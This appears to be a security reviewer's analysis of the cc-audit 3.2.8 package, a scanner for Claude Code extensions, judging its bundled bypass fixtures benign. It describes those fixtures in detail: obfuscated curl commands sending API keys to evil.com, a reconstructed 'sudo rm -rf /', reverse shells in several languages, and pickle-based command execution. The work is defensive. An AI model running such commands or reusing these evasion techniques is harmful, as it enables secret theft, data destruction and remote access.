identification: cc-audit 3.2.8 Rust source distribution: security auditor for Claude Code skills, hooks and MCP servers

prior_release.verification: forager retrieved the Go proxy ZIP and verified its module contents against sum.golang.org; Cargo.toml confirms Rust package version 3.2.7

decisive_diff.description: Executable changes add std::time::Instant scan timing and elapsed_ms in ScanResult/serializers/terminal output and fixture initializers. Remaining differences are release versions and changelog. All dependencies are unchanged; all four flagged examples and every other bypass example are byte-identical.

execution_review.application: main.rs dispatches explicit CLI subcommands. ScannerConfig reads text and applies RuleEngine; CommandScanner does not execute scanned commands. No reviewed entrypoint invokes the bypass example scripts. Cargo has no build.rs or install hook launching them. The npm wrapper selects its platform optional dependency and forwards argv through execFileSync; CI installs/builds and invokes the auditor. These files are also unchanged.
execution_review.hex-octal.sh: Unguarded bash -c command substitution reconstructs sudo rm -rf /; GNU rm root protection can reject the request. Hex printf produces curl as the command word and supplies SECRET as request data. ANSI-C hex quoting makes sudo the command for rm -rf /tmp/target. Intended octal bytes decode to curl https://evil.com -d $API_KEY, but the external echo variant is platform-dependent and its non-zero-prefixed octal escapes are not portable; no successful execution is inferred. MNUGK4TF decodes to chere, contrary to the curl comment, and is piped into Bash. All five existing suspicious observations are accurate and retained.
execution_review.polyglot.sh: Python connects TCP, duplicates socket descriptors onto stdin/stdout/stderr and calls an interactive shell. Perl redirects standard handles to a connected socket and execs a shell; Ruby obtains a socket fd for shell redirects. Bash /dev/tcp explicitly bridges shell stdio and a later command loop. Awk reads commands from its TCP coprocess. Telnet and a shell form a same-FIFO relay. Socat connects out and spawns a PTY shell. PHP/Lua use a literal fd 3 without proving which fd their socket received. Sequential blocking/failure and the Awk loop can prevent later lines from running; capabilities do not assert every variant runs successfully. Existing reverse-shell findings describe real source behavior.
execution_review.node-evasion.js: Top-level dynamic require reconstructs child_process; cp.exec places API_KEY in curl -d. eval builds a command from fragments. A Function constructor is invoked with require; vm receives executable process source. Base64 decodes to curl https://evil.com -d $API_KEY and passes the string to exec. Further code modifies Object.prototype.exec, dynamically imports child_process, creates an eval worker with secret-bearing curl, POSTs an API key as JSON with fetch, and sends SECRET on a WebSocket open event. Existing notable operations cover these primitives; process/env/body/WebSocket links are represented. VM require resolution or other errors can stop later statements. A secret-named variable sent in a request alone does not distinguish theft from ordinary authenticated traffic.
execution_review.python-evasion.py: Dynamic requests import sends API_KEY as POST body; reflected urlopen appends SECRET to a URL. Character codes construct import os; compile/exec and decoded Base64 eval execute os.system source. A lambda calls os.system, a shell=True subprocess contains TOKEN, and pickle bytes encode an os.system reduction. globals builtins indexing may fail when __builtins__ is a module, stopping later lines. ast.literal_eval attack and libc.system are commented out; ctypes.CDLL(None) loads current-process symbols but does not itself call system. Existing import, HTTP, decode, exec/eval, reflection, subprocess and unsafe-deserialization findings cover the supported primitives.

context: Explicit bypass README, source distribution, static scanning call paths and unchanged examples support BENIGN. No machine deployment, operator authorization or evidence of these fixtures being run as payloads was provided; isolated executable attack scripts would need that context.

rule_change.supported_claim: A parsed call target consists entirely of printable hexadecimal escapes inside an ANSI-C quote, so those bytes construct an executable command name. This adds the missing execution relationship to the existing neutral escape-decoding observation.
rule_change.scope: shell on Unix; independent of package, path, hostname, command and version
rule_change.consumer_audit: No exact hex selector consumers. Four ancestor selectors reviewed: three JS/TS-only consumers cannot receive this shell finding; the stego consumer additionally requires its independent image/payload markers. Full archive and standalone comparisons confirm no additional unintended composite activations.

tests.method: Static cleave/atomscan analysis only; fixtures were never executed.

remaining_disagreements: Archive classifier probability remains 0.99 (lvl 279, conf 80), despite BENIGN packaging/diff evidence. Accurate behavior was retained rather than suppressed to lower its score.
The prior v3.2.7 also has all seven original suspicious traits and probability 0.99 under current rules; the queue clean-baseline premise is not reproduced.
Standalone polyglot has one hostile dev/tcp finding; the existing archive-aware cc-audit identity downgrade makes it suspicious inside the package. No rule was weakened here.
The engine reports partial source-flow/embedded-source analysis in some members; manual source and release-diff review supplies the decisive evidence.
